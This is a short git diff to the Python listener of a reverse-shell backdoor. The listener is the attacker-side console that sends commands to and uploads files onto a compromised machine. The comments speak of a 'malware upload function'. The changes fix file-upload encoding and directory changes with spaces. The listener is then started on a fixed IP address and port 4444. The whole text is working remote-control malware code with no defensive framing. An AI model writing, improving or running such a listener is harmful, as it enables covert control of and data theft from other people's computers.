@@ -66,7 +66,9 @@ class Listener:
                 # if first input argument is upload, run the malware upload function
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
-                    command.append(file_content)
+                    command.append(file_content.decode())
+                elif command[0] == "cd" and len(command) > 2:
+                    command[1] = " ".join(command[1:])
                     
                 # run execute remotely function to exceute the command entered in the listener and store the returned output in result
                 result = self.execute_remotely(command)
@@ -77,7 +79,7 @@ class Listener:
             except Exception:
                 result = "[-] Error during command execution."
 
-            print(result) #returns "[+] Download successful."
+            print(result) #returns for example "[+] Download successful."
 
 my_listener = Listener("172.172.186.182", 4444)
 my_listener.run()
